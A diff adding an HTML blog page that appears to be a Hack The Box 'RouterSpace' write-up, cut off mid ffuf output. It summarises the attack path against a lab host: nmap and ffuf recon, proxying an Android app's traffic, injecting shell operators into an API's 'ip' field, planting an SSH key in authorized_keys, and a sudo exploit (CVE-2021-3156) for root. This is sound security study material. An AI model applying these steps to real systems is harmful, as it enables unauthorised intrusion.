@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>HTB Routerspace Writeup - Yash hacks stuff</title><meta name="Description" content=""><meta property="og:title" content="HTB Routerspace Writeup" />
+<meta property="og:description" content="RouterSpace HTB   Process   Added routerspace.htb to /etc/hosts using sudo echo &#39;&lt;ip&gt; routerspace.htb&#39; &gt;&gt; /etc/hosts
+  Nmap
+ Found two tcp open ports and no udp ports 22/tcp open ssh 80/tcp open http    DirEnumeration
+ ffuf and gobuster scan carried out on routerspace.htb =&gt; No useful dir founds    VhostEnumeration
+ No useful subdomains found    http{?:}//routerspace.htb
+ No actionable OSINT found Found a hyperlink to an apk =&gt; routerspace." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.yashhacksstuff.tech/routerspace/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-07T12:32:16+05:30" />
+<meta property="article:modified_time" content="2022-03-07T12:32:16+05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB Routerspace Writeup"/>
+<meta name="twitter:description" content="RouterSpace HTB   Process   Added routerspace.htb to /etc/hosts using sudo echo &#39;&lt;ip&gt; routerspace.htb&#39; &gt;&gt; /etc/hosts
+  Nmap
+ Found two tcp open ports and no udp ports 22/tcp open ssh 80/tcp open http    DirEnumeration
+ ffuf and gobuster scan carried out on routerspace.htb =&gt; No useful dir founds    VhostEnumeration
+ No useful subdomains found    http{?:}//routerspace.htb
+ No actionable OSINT found Found a hyperlink to an apk =&gt; routerspace."/>
+<meta name="application-name" content="Yash Tyagi">
+<meta name="apple-mobile-web-app-title" content="Yash Tyagi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.yashhacksstuff.tech/routerspace/" /><link rel="prev" href="https://www.yashhacksstuff.tech/firstpost/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTB Routerspace Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.yashhacksstuff.tech\/routerspace\/"
+        },"genre": "posts","keywords": "Linux, Easy, APK, Anbox, Active","wordcount":  1873 ,
+        "url": "https:\/\/www.yashhacksstuff.tech\/routerspace\/","datePublished": "2022-03-07T12:32:16+05:30","dateModified": "2022-03-07T12:32:16+05:30","publisher": {
+            "@type": "Organization",
+            "name": "Yash"},"author": {
+                "@type": "Person",
+                "name": "Yash"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Yash hacks stuff"><span class="header-title-pre"><i class= far fa-fw'></i></span>Yash hacks stuff</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> HTB Writeups </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/" title="GitHub"><a href='https://github.com/yashtyagi-cjg'><i class='fab fa-github fa-fw'></i></a>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Yash hacks stuff"><span class="header-title-pre"><i class= far fa-fw'></i></span>Yash hacks stuff</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">HTB Writeups</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/" title="GitHub"><a href='https://github.com/yashtyagi-cjg'><i class='fab fa-github fa-fw'></i></a></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">HTB Routerspace Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Yash</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-easy/"><i class="far fa-folder fa-fw"></i>Linux Easy</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-03-07">2022-03-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1873 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap-scans">Nmap Scans</a></li>
+        <li><a href="#ffuf">FFUF</a></li>
+      </ul>
+    </li>
+    <li><a href="#routerspace-webpage">RouterSpace Webpage</a>
+      <ul>
+        <li><a href="#homepage">Homepage</a></li>
+        <li><a href="#additional-links-found">Additional Links Found</a></li>
+        <li><a href="#installing-anbox-and-apk">Installing Anbox and APK</a></li>
+        <li><a href="#proxy-settings">Proxy settings</a></li>
+        <li><a href="#request">Request</a></li>
+        <li><a href="#foothold">Foothold</a>
+          <ul>
+            <li><a href="#request-1">Request</a></li>
+            <li><a href="#response">Response</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#foothold-1">Foothold</a>
+      <ul>
+        <li><a href="#user-flag">User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#executing-linpeassh">Executing Linpeas.sh</a>
+          <ul>
+            <li><a href="#sudo-version-exploit">Sudo version exploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><img src="/images/routerspace/routerspace.png"/><figcaption>
+            <h4>RouterSpace HTB</h4>
+        </figcaption>
+</figure>
+
+<h1 id="process">Process</h1>
+<ul>
+<li>
+<p>Added routerspace.htb to /etc/hosts using <code>sudo echo '&lt;ip&gt; routerspace.htb' &gt;&gt; /etc/hosts</code></p>
+</li>
+<li>
+<p>Nmap</p>
+<ul>
+<li>Found two tcp open ports and no udp ports</li>
+<li>22/tcp open  ssh</li>
+<li>80/tcp open  http</li>
+</ul>
+</li>
+<li>
+<p>DirEnumeration</p>
+<ul>
+<li>ffuf and gobuster scan carried out on routerspace.htb =&gt; No useful dir founds</li>
+</ul>
+</li>
+<li>
+<p>VhostEnumeration</p>
+<ul>
+<li>No useful subdomains found</li>
+</ul>
+</li>
+<li>
+<p>http://routerspace.htb</p>
+<ul>
+<li>No actionable OSINT found</li>
+<li>Found a hyperlink to an apk =&gt; routerspace.apk</li>
+</ul>
+</li>
+<li>
+<p>Anbox</p>
+<ul>
+<li>Started anbox for testing the routerspace.apk</li>
+<li>Installed the apk using <code>adb install routerspace.apk</code></li>
+<li>Configured the proxy to intercept the requests on port 8999 on all interfaces</li>
+<li>Configure the adb to send requests to the <code>&lt;ip&gt;:8999</code> =&gt; <code>adb shell settings put global http_proxy 192.168.250.1:8999</code></li>
+<li>Intercepted a POST request to <code>/api/v4/monitoring/router/dev/check/deviceAccess</code></li>
+</ul>
+</li>
+<li>
+<p>Command Injection</p>
+<ul>
+<li>POST request had json in its body with parameter ip</li>
+<li>using operator such as <code>&amp;, |, ;</code></li>
+</ul>
+</li>
+<li>
+<p>Foothold</p>
+<ul>
+<li>None of the reverse shell worked</li>
+<li>Most probably because of the ip tables configuration</li>
+<li>On enumeration, USER: Paul was found to have write privileges on .ssh</li>
+<li>Generated an ssh key pair using ssh-keygen and uploaded the public key to /home/paul/.ssh/authorized_keys</li>
+<li>Now using the private key we logged on the routerspace.htb</li>
+</ul>
+</li>
+<li>
+<p>Privilege Escalation</p>
+<ul>
+<li>Executed linpeas script found the sudo version vulnerable</li>
+<li>Searched for the exploit and executed it =&gt;CVE-2021-3156</li>
+</ul>
+</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scans">Nmap Scans</h3>
+<ul>
+<li>Found two tcp ports open
+<ul>
+<li>22/tcp ssh</li>
+<li>80/tcp http</li>
+</ul>
+</li>
+<li>Results cororborated by masscan</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -A -sC -Pn routerspace.htb -oN nmap.adc
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> babayaga: 
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> will be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-06 15:23 IST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> routerspace.htb <span class="o">(</span>10.129.151.201<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> filtered ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    SSH-2.0-RouterSpace Packet Filtering V1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Powered-By: RouterSpace
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Cdn: RouterSpace-10471
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">79</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     ETag: W/<span class="s2">&#34;4f-UUpLZjWmW065QhEa4gf63Kfxs/I&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">06</span> Mar <span class="m">2022</span> 09:53:40 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Suspicious activity detected !!! <span class="o">{</span>RequestID: t nYh 4l l S ct m ny Cr <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Powered-By: RouterSpace
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Cdn: RouterSpace-59306
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Accept-Ranges: bytes
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: public, max-age<span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Last-Modified: Mon, <span class="m">22</span> Nov <span class="m">2021</span> 11:33:57 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     ETag: W/<span class="s2">&#34;652c-17d476c9285&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">25900</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">06</span> Mar <span class="m">2022</span> 09:53:38 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!doctype html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;zxx&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;RouterSpace&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;description&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/bootstrap.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/owl.carousel.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/magnific-popup.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/font-awesome.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/themify-icons.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Powered-By: RouterSpace
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Cdn: RouterSpace-86858
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Allow: GET,HEAD,POST
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">13</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     ETag: W/<span class="s2">&#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">06</span> Mar <span class="m">2022</span> 09:53:39 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     GET,HEAD,POST
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest, X11Probe: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: RouterSpace
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span class="line"><span class="cl"><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+</span></span><span class="line"><span class="cl">SF-Port22-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>3/6%Time<span class="o">=</span>622484A0%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NULL,
+</span></span><span class="line"><span class="cl">SF:29,<span class="s2">&#34;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+</span></span><span class="line"><span class="cl">SF-Port80-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>3/6%Time<span class="o">=</span>622484A0%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetRe
+</span></span><span class="line"><span class="cl">SF:quest,13E4,<span class="s2">&#34;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterS
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:iption\&#34;\x20content=\&#34;\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20content=\&#34;width=device-width,\x20initial-scale=1\&#34;&gt;\n\n\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/bootstrap\.min\.css\&#34;&gt;\n\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/owl\.carousel\.m
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:in\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/m
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:agnific-popup\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:GrVt1nR4x\+qdNZ2GqyRo\&#34;\r\nDate:\x20Sun,\x2006\x20Mar\x202022\x2009:53:
+</span></span></span><span class="line"><span class="cl"><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="s2">Aggressive OS guesses: Linux 5.4 (92%), Linux 4.15 - 5.6 (90%), Crestron XPanel control system (90%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 5.0 (89%), Linux 5.0 - 5.3 (89%), Linux 5.0 - 5.4 (88%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
+</span></span></span><span class="line"><span class="cl"><span class="s2">No exact OS matches for host (test conditions non-ideal).
+</span></span></span><span class="line"><span class="cl"><span class="s2">Network Distance: 2 hops
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">TRACEROUTE (using port 80/tcp)
+</span></span></span><span class="line"><span class="cl"><span class="s2">HOP RTT       ADDRESS
+</span></span></span><span class="line"><span class="cl"><span class="s2">1   157.47 ms 10.10.14.1
+</span></span></span><span class="line"><span class="cl"><span class="s2">2   157.52 ms routerspace.htb (10.129.151.201)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 43.41 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ffuf">FFUF</h3>
+<ul>
+<li>No useful directories found</li>
+<li>Recived valid response for garbage input with no similarity accross the response to deploy the filters</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://routerspace.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.js,.html -of md -o dir.common.routerspace -c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
